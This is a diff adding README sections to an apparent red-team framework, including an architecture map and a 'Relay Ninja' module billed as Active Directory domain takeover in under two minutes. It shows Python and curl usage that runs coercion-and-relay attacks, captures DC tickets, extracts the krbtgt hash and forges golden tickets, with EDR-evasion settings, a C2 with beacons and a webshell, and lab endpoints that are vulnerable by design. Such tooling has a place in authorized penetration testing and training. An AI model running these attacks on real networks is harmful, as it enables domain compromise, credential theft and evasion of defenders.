@@ -16,17 +16,177 @@ Access the UI at `http://localhost:8080`
 
 ---
 
+## �️ Project Architecture Map
+
+```
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                            🔴 MONOLITH PENTEST FRAMEWORK                                │
+│                     Elite Red Team Automation & Training Platform                        │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                                    📂 CORE MODULES                                      │
+├─────────────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────────────────────┐   │
+│  │                         🎫 KERBEROS ATTACK CHAIN                                │   │
+│  │  cybermodules/kerberos_chain.py + kerberos_relay_ninja.py                       │   │
+│  │                                                                                  │   │
+│  │  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐      │   │
+│  │  │ AS-REP   │──▶│Kerberoast│──▶│   OPTH   │──▶│  Silver  │──▶│  Golden  │      │   │
+│  │  │ Roasting │   │ SPN Enum │   │ PtH/PtT  │   │  Ticket  │   │  Ticket  │      │   │
+│  │  └──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘      │   │
+│  │                                      │                                          │   │
+│  │                               🥷 RELAY NINJA                                    │   │
+│  │                    ┌─────────────────┴─────────────────┐                        │   │
+│  │                    ▼                                   ▼                        │   │
+│  │  ┌────────────────────────────┐   ┌────────────────────────────┐               │   │
+│  │  │ Unconstrained Delegation   │   │    Coercion Attacks        │               │   │
+│  │  │ • Find vuln machines       │   │ • ShadowCoerce (MS-FSRVP)  │               │   │
+│  │  │ • Capture TGTs             │   │ • PrinterBug (MS-RPRN)     │               │   │
+│  │  │ • S4U2Self/Proxy           │   │ • PetitPotam (MS-EFSRPC)   │               │   │
+│  │  │ • AI: get_next_best_jump() │   │ • DFSCoerce (MS-DFSNM)     │               │   │
+│  │  └────────────────────────────┘   └────────────────────────────┘               │   │
+│  └─────────────────────────────────────────────────────────────────────────────────┘   │
+│                                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────────────────────┐   │
+│  │                           🔄 NTLM RELAY MODULE                                  │   │
+│  │  cybermodules/ntlm_relay.py                                                     │   │
+│  │                                                                                  │   │
+│  │  Targets: LDAP │ SMB │ HTTP │ AD CS (ESC8)                                      │   │
+│  │  Attacks: RBCD │ Shadow Credentials │ DCSync │ Add User/Computer                │   │
+│  └─────────────────────────────────────────────────────────────────────────────────┘   │
+│                                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────────────────────┐   │
+│  │                          🛡️ EVASION ENGINE                                      │   │
+│  │  evasion/ + cybermodules/evasion.py                                             │   │
+│  │                                                                                  │   │
+│  │  ┌───────────────┐ ┌───────────────┐ ┌───────────────┐ ┌───────────────┐       │   │
+│  │  │   AMSI/ETW    │ │   Sleepmask   │ │   Process     │ │   Syscall     │       │   │
+│  │  │   Bypass      │ │   Cloaking    │ │   Injection   │ │   Obfuscation │       │   │
+│  │  └───────────────┘ └───────────────┘ └───────────────┘ └───────────────┘       │   │
+│  │  ┌───────────────┐ ┌───────────────┐ ┌───────────────┐ ┌───────────────┐       │   │
+│  │  │  Persistence  │ │ Anti-Sandbox  │ │Traffic Masking│ │Header Rotation│       │   │
+│  │  │  God Mode     │ │ VM Detection  │ │ C2 Disguise   │ │ JA3 Rotation  │       │   │
+│  │  └───────────────┘ └───────────────┘ └───────────────┘ └───────────────┘       │   │
+│  └─────────────────────────────────────────────────────────────────────────────────┘   │
+│                                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────────────────────┐   │
+│  │                           🔀 LATERAL MOVEMENT                                   │   │
+│  │  cybermodules/lateral_movement.py + lateral_evasion.py                          │   │
+│  │                                                                                  │   │
+│  │  Methods: WMIExec │ PSExec │ SMBExec │ DCOMExec │ AtExec                        │   │
+│  │  Profiles: None │ Default │ Stealth │ Paranoid │ Aggressive                     │   │
+│  └─────────────────────────────────────────────────────────────────────────────────┘   │
+│                                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────────────────────┐   │
+│  │                            🎯 C2 FRAMEWORK                                      │   │
+│  │  cybermodules/c2_beacon.py + c2_framework.py                                    │   │
+│  │                                                                                  │   │
+│  │  ┌────────────┐    ┌────────────┐    ┌────────────┐    ┌────────────┐          │   │
+│  │  │  Python    │    │ PowerShell │    │   Bash     │    │    PHP     │          │   │
+│  │  │  Beacon    │    │  Beacon    │    │  Beacon    │    │  Webshell  │          │   │
+│  │  └─────┬──────┘    └─────┬──────┘    └─────┬──────┘    └─────┬──────┘          │   │
+│  │        │                 │                 │                 │                  │   │
+│  │        └─────────────────┴────────┬────────┴─────────────────┘                  │   │
+│  │                                   ▼                                             │   │
+│  │                    ┌──────────────────────────┐                                 │   │
+│  │                    │   🖥️ C2 Server           │                                 │   │
+│  │                    │  • Task Queue            │                                 │   │
+│  │                    │  • Encrypted Comms       │                                 │   │
+│  │                    │  • Loot Collection       │                                 │   │
+│  │                    └──────────────────────────┘                                 │   │
+│  └─────────────────────────────────────────────────────────────────────────────────┘   │
+│                                                                                         │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                                 📊 REPORTING & INTEL                                    │
+├─────────────────────────────────────────────────────────────────────────────────────────┤
+│  tools/report_generator.py                                                              │
+│                                                                                         │
+│  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐  ┌───────────────┐            │
+│  │   HTML        │  │  Markdown     │  │    JSON       │  │   MITRE       │            │
+│  │  Executive    │  │  Technical    │  │    Data       │  │  ATT&CK       │            │
+│  │  Dashboard    │  │   Report      │  │   Export      │  │   Matrix      │            │
+│  └───────────────┘  └───────────────┘  └───────────────┘  └───────────────┘            │
+│                                                                                         │
+│  Visualizations: Timeline │ Network Graph │ Risk Heatmap │ Attack Flow                  │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                              🎓 VULNERABLE BY DESIGN                                    │
+├─────────────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                         │
+│  /vuln/sqli      → SQL Injection           /api/vuln/jwt    → JWT Weakness              │
+│  /vuln/cmdi      → Command Injection       /api/vuln/idor   → IDOR                      │
+│  /vuln/ssti      → Template Injection      /api/vuln/mass   → Mass Assignment           │
+│  /vuln/deserial  → Deserialization         /vuln/upload     → File Upload               │
+│  /vuln/ssrf      → SSRF                    /vuln/cors       → CORS Misconfig            │
+│                                                                                         │
+│  Default Creds: admin:admin123 │ analyst:analyst123                                     │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────────────────────────────────────┐
+│                                📁 DIRECTORY STRUCTURE                                   │
+├─────────────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                         │
+│  monolith/                                                                              │
+│  ├── cyberapp/              # Flask web application                                     │
+│  │   ├── routes/            # API endpoints (kerberos, relay, evasion, lateral, c2)    │
+│  │   ├── models/            # Database models                                           │
+│  │   ├── services/          # Business logic                                            │
+│  │   └── workers/           # Background tasks (RQ)                                     │
+│  │                                                                                      │
+│  ├── cybermodules/          # Core attack modules                                       │
+│  │   ├── kerberos_chain.py          # Kerberos attacks                                  │
+│  │   ├── kerberos_relay_ninja.py    # 🥷 Domain takeover <2min                          │
+│  │   ├── ntlm_relay.py              # NTLM relay + coercion                             │
+│  │   ├── lateral_movement.py        # Lateral techniques                                │
+│  │   ├── evasion.py                 # Evasion profiles                                  │
+│  │   ├── c2_beacon.py               # C2 beacon management                              │
+│  │   └── ...                        # 30+ modules                                       │
+│  │                                                                                      │
+│  ├── evasion/               # Advanced evasion techniques                               │
+│  │   ├── amsi_bypass.py             # AMSI/ETW bypass                                   │
+│  │   ├── sleepmask_cloak.py         # Memory cloaking                                   │
+│  │   ├── process_injection.py       # Injection techniques                              │
+│  │   ├── syscall_obfuscator.py      # Syscall unhooking                                 │
+│  │   └── persistence_god.py         # Persistence mechanisms                            │
+│  │                                                                                      │
+│  ├── tools/                 # Standalone tools                                          │
+│  │   └── report_generator.py        # Professional reporting                            │
+│  │                                                                                      │
+│  ├── configs/               # Configuration files                                       │
+│  │   ├── relay_ninja_config.yaml    # Relay Ninja settings                              │
+│  │   └── evasion_profile_*.yaml     # Evasion profiles                                  │
+│  │                                                                                      │
+│  ├── agents/                # Deployable agents                                         │
+│  │   ├── python_beacon.py           # Python C2 agent                                   │
+│  │   └── evasive_beacon.py          # Evasion-enabled agent                             │
+│  │                                                                                      │
+│  ├── templates/             # Web UI templates                                          │
+│  ├── tests/                 # Test suite                                                │
+│  └── docs/                  # Documentation                                             │
+│                                                                                         │
+└─────────────────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
 ## 📦 Feature Overview
 
 | Module | Description | UI Page |
 |--------|-------------|---------|
 | **Kerberos Attack Chain** | AS-REP, Kerberoast, OPTH, Golden/Silver Tickets | `/kerberos` |
+| **🥷 Relay Ninja** | Domain takeover <2min via delegation + coercion | `/relay` |
 | **NTLM Relay** | LDAP/SMB/AD CS relay with coercion triggers | `/relay` |
 | **Evasion Testing** | YARA, strings, entropy, behavioral analysis | `/evasion` |
 | **Lateral Movement** | WMI/PSExec/DCOM with evasion profiles | `/lateral` |
 | **C2 Framework** | Beacon management with multi-language agents | `/c2` |
 | **Process Injection** | Shellcode injection with LOTL execution | `/payloads` |
 | **Attack Graph** | BloodHound-style path visualization | `/attack-graph` |
+| **Reporting** | Professional HTML/MD/JSON reports | `/reports` |
 
 ---
 
@@ -160,6 +320,150 @@ curl -X POST http://localhost:8080/relay/coerce/check \
        │◀──────────────────│───────────────────│
        │                   │                   │
 ```
+
+---
+
+## 🥷 Kerberos Relay Ninja - Domain Takeover <2min
+
+**Ultimate AD takeover module**: Unconstrained Delegation + PrinterBug/ShadowCoerce relay chain for rapid domain compromise.
+
+### 🎯 Attack Flow
+
+```
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│                    🥷 RELAY NINJA DOMAIN TAKEOVER                               │
+│                         Target: <2 Minutes to DA                                │
+└─────────────────────────────────────────────────────────────────────────────────┘
+         │
+         ▼
+┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
+│   1. RECON      │────▶│   2. SETUP      │────▶│   3. COERCE     │
+│ findDelegation  │     │ Start krbrelayx │     │ ShadowCoerce/   │
+│ Find targets    │     │ TGT capture on  │     │ PrinterBug      │
+│ with unconstrd  │     │                 │     │ triggers DC     │
+└─────────────────┘     └─────────────────┘     └─────────────────┘
+                                                        │
+         ┌──────────────────────────────────────────────┘
+         ▼
+┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
+│  4. CAPTURE     │────▶│   5. DCSYNC     │────▶│  6. VICTORY!    │
+│ DC authenticates│     │ Use DC$ TGT to  │     │ 🏆 Domain Admin │
+│ to our listener │     │ extract krbtgt  │     │ Golden Ticket   │
+│ 🎫 Got TGT!     │     │ hash via DCSync │     │ forged!         │
+└─────────────────┘     └─────────────────┘     └─────────────────┘
+```
+
+### Coercion Methods
+
+| Method | Protocol | Description | EDR Detection |
+|--------|----------|-------------|---------------|
+| **ShadowCoerce** | MS-FSRVP | VSS Agent coercion - newest, least detected | 🟢 Low |
+| **PrinterBug** | MS-RPRN | Print Spooler coercion - classic, reliable | 🟡 Medium |
+| **PetitPotam** | MS-EFSRPC | EFS coercion - may be patched | 🔴 High |
+| **DFSCoerce** | MS-DFSNM | DFS Namespace coercion | 🟢 Low |
+
+### AI-Powered Jump Selector
+
+The `get_next_best_jump()` function analyzes delegation weak spots:
+
+```python
+from cybermodules.kerberos_relay_ninja import get_ai_jump_recommendation
+
+# Get AI recommendation for best lateral jump
+recommendation = get_ai_jump_recommendation(
+    domain="corp.local",
+    dc_ip="10.0.0.1",
+    username="lowpriv",
+    password="Password123"
+)
+
+print(recommendation)
+# {
+#   'target': 'dc01.corp.local',
+#   'score': 95,
+#   'reason': 'Unconstrained delegation - can capture any TGT; Domain Controller - direct DA path',
+#   'action': 'Coerce DC dc01.corp.local, capture TGT, forge golden ticket',
+#   'coercion_method': 'shadow',
+#   'estimated_time': '30-60 seconds'
+# }
+```
+
+### Quick Usage
+
+```python
+from cybermodules.kerberos_relay_ninja import quick_takeover, RelayMode
+
+# One-liner domain takeover
+result = quick_takeover(
+    domain="corp.local",
+    dc_ip="10.0.0.1",
+    username="lowpriv",
+    password="Password123",
+    relay_mode="shadow"  # shadow, printer, petit, dfs, all, ai_select
+)
+
+if result.success:
+    print(f"🏆 Domain taken over in {result.total_duration_ms}ms!")
+    print(f"krbtgt hash: {result.krbtgt_hash}")
+```
+
+### API Endpoints
+
+```bash
+# Start Relay Ninja Attack
+curl -X POST http://localhost:8080/relay/ninja/start \
+  -H "Content-Type: application/json" \
+  -d '{
+    "domain": "corp.local",
+    "dc_ip": "10.0.0.1",
+    "username": "lowpriv",
+    "password": "Password123",
+    "relay_mode": "shadow"
+  }'
+
+# Get AI Jump Recommendation
+curl -X POST http://localhost:8080/relay/ninja/recommend \
+  -H "Content-Type: application/json" \
+  -d '{"domain": "corp.local", "dc_ip": "10.0.0.1", "username": "user", "password": "pass"}'
+
+# Check Coercion Methods
+curl -X POST http://localhost:8080/relay/ninja/coerce/check \
+  -H "Content-Type: application/json" \
+  -d '{"target": "dc01.corp.local", "listener": "10.0.0.100"}'
+```
+
+### Configuration (relay_ninja_config.yaml)
+
+```yaml
+relay_ninja:
+  relay_mode: shadow    # shadow, printer, petit, dfs, all, ai_select
+  auto_trigger: true
+  total_timeout: 120    # 2 minute target
+  
+  ai_selector:
+    enabled: true
+    detected_edr: none  # crowdstrike, sentinelone, defender
+  
+  evasion:
+    enabled: true
+    profile: stealth    # none, default, stealth, paranoid
+
+# Quick presets
+presets:
+  blitz:    # Fast and dirty - 60s
+  ghost:    # Maximum stealth - 5min
+  ninja:    # Balanced - AI-select
+```
+
+### MITRE ATT&CK Mapping
+
+| Phase | Technique ID | Name |
+|-------|-------------|------|
+| Coerce | T1187 | Forced Authentication |
+| Relay | T1557.001 | LLMNR/NBT-NS Poisoning and SMB Relay |
+| DCSync | T1003.006 | OS Credential Dumping: DCSync |
+| Forge | T1558.001 | Steal or Forge Kerberos Tickets: Golden Ticket |
+| RBCD | T1134.001 | Access Token Manipulation |
 
 ---
 
